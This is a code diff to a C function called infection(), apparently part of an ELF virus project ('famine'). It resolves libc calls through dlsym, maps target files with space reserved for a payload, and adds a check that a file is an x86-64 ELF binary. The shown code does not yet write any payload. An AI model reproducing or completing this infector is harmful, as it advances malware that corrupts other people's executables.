@@ -1,7 +1,15 @@
 #include "famine.h"
 #include <signal.h>
 
-int  infection(void *(*dlsym)(void *, const char *), void *handle, struct bfile *file,
+static int  isCompatible(unsigned char e_ident[EI_NIDENT], Elf64_Half e_machine) {
+  return (e_ident[EI_MAG0] == ELFMAG0 &&
+          e_ident[EI_MAG1] == ELFMAG1 &&
+          e_ident[EI_MAG2] == ELFMAG2 &&
+          e_ident[EI_MAG3] == ELFMAG3 &&
+          e_machine == EM_X86_64);
+}
+
+int  infection(void *(*dlsym)(void *, const char *), void *handle,
 const char *dirname,  const char *filename, const char *payload) {
   void    *(*malloc)(size_t);
   char    *(*strcpy)(char *, const char *);
@@ -10,10 +18,11 @@ const char *dirname,  const char *filename, const char *payload) {
   int     (*open)(const char *, int);
   int     (*close)(int);
   void    (*free)(void *);
-  int     (*fstat)(int, struct stat *);
+  int     (*fstat)(int, int, struct stat *);
   int     (*dprintf)(int, const char *, ...);
   void    (*raise)(int);
   void    *(*mmap)(void *, size_t, int, int, int, off_t);
+  int     (*munmap)(void *, size_t);
   char    mallocName[] = "malloc";
   char    strcpyName[] = "strcpy";
   char    strcatName[] = "strcat";
@@ -23,6 +32,7 @@ const char *dirname,  const char *filename, const char *payload) {
   char    freeName[] = "free";
   char    fstatName[] = "__fxstat";
   char    mmapName[] = "mmap";
+  char    munmapName[] = "munmap";
   char    dprintfName[] = "dprintf";
   char    raiseName[] = "raise";
   char    slash[] = "/";
@@ -35,15 +45,15 @@ const char *dirname,  const char *filename, const char *payload) {
   free = dlsym(handle, freeName);
   fstat = dlsym(handle, fstatName);
   mmap = dlsym(handle, mmapName);
+  munmap = dlsym(handle, munmapName);
   strlen = dlsym(handle, strlenName);
   dprintf = dlsym(handle, dprintfName);
   raise = dlsym(handle, raiseName);
 
-  char  yo[] = "Functions: %p\n";
-
   int         fd;
   char        *tmp;
   struct stat stats;
+  struct bfile file;
 
   if ((tmp = malloc(strlen(dirname) + strlen(filename) + 2)) == NULL)
     return (-1);
@@ -55,15 +65,19 @@ const char *dirname,  const char *filename, const char *payload) {
     return (-1);
   }
   free(tmp);
-  if (fstat(fd, &stats) == -1) {
+  if (fstat(1, fd, &stats) == -1) {
+    raise(SIGTRAP);
     close(fd);
     return (-1);
   }
-  file->size = stats.st_size;
-  if ((file->header = mmap(NULL, file->size + strlen(payload) + 1, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED) {
+  file.size = stats.st_size;
+  if ((file.header = mmap(NULL, file.size + strlen(payload) + 1, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED) {
     close(fd);
     return (-1);
   }
   close(fd);
+  if ((size_t)(file.size) < sizeof(Elf64_Ehdr) || !isCompatible(file.header->e_ident, file.header->e_machine))
+    return (-1);
+  munmap(file.header, file.size);
   return (0);
 }
